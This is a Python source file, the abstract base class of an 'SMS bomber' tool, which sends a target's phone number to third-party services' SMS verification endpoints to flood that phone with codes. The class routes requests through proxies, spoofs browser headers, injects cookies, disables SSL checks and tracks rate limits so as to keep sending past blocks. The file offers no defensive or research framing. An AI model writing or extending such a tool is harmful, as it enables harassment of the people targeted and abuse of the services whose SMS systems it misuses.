"""Base service interface for SMS bomber modules."""

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

import aiohttp


class SendStatus(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    RATE_LIMITED = "rate_limited"
    TIMEOUT = "timeout"
    BLOCKED = "blocked"


@dataclass
class SendResult:
    service_name: str
    status: SendStatus
    http_status: Optional[int] = None
    error: Optional[str] = None
    response_preview: Optional[str] = None
    elapsed: float = 0.0

    @property
    def is_success(self) -> bool:
        return self.status == SendStatus.SUCCESS

    @property
    def is_error(self) -> bool:
        return self.status in (
            SendStatus.FAILED,
            SendStatus.TIMEOUT,
            SendStatus.BLOCKED,
        )


DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "*/*",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive",
}


class BaseService(ABC):
    """Abstract base for all SMS bomber services.

    Each service module in services/ subclasses this and implements:
      - service_name (class attr): short slug e.g. 'tinkoff'
      - build_payload(phone: str) -> dict
    """

    service_name: str = ""
    url: str = ""
    method: str = "POST"
    payload_type: str = "json"  # "json", "data", "url"
    success_code: int = 200
    rate_limit_seconds: int = 60
    requires_cookies: bool = False
    cookies_url: str = ""
    format_key: str = "+7"  # phone format variant to use

    @abstractmethod
    def build_payload(self, phone_formats: dict) -> dict:
        """Build the request payload using formatted phone variants."""
        ...

    async def send_sms(
        self,
        phone_formats: dict,
        session: aiohttp.ClientSession,
        proxy: Optional[str] = None,
        cookies: Optional[dict] = None,
    ) -> SendResult:
        """Send an SMS code request to this service.

        Args:
            phone_formats: Dict of phone format variants from format_phone_ru()
            session: Shared aiohttp session
            proxy: Optional proxy URL
            cookies: Optional cookies dict to inject into the request

        Returns:
            SendResult with status and metadata
        """
        import asyncio
        import time

        start = time.monotonic()
        try:
            payload = self.build_payload(phone_formats)
            headers = dict(DEFAULT_HEADERS)

            kwargs = {
                "headers": headers,
                "timeout": aiohttp.ClientTimeout(total=15),
                "ssl": False,
            }
            if proxy:
                kwargs["proxy"] = proxy
            if cookies:
                kwargs["cookies"] = cookies

            if self.payload_type == "json":
                kwargs["json"] = payload
            else:
                kwargs["data"] = payload

            async with session.request(
                self.method, self.url, **kwargs
            ) as resp:
                elapsed = time.monotonic() - start
                if resp.status == self.success_code:
                    return SendResult(
                        self.service_name,
                        SendStatus.SUCCESS,
                        resp.status,
                        elapsed=elapsed,
                    )
                elif resp.status in (429, 503):
                    return SendResult(
                        self.service_name,
                        SendStatus.RATE_LIMITED,
                        resp.status,
                        elapsed=elapsed,
                    )
                else:
                    body = await resp.text()
                    return SendResult(
                        self.service_name,
                        SendStatus.FAILED,
                        resp.status,
                        error=body[:200],
                        elapsed=elapsed,
                    )
        except asyncio.TimeoutError:
            return SendResult(
                self.service_name, SendStatus.TIMEOUT, elapsed=time.monotonic() - start
            )
        except Exception as e:
            return SendResult(
                self.service_name,
                SendStatus.FAILED,
                error=str(e),
                elapsed=time.monotonic() - start,
            )
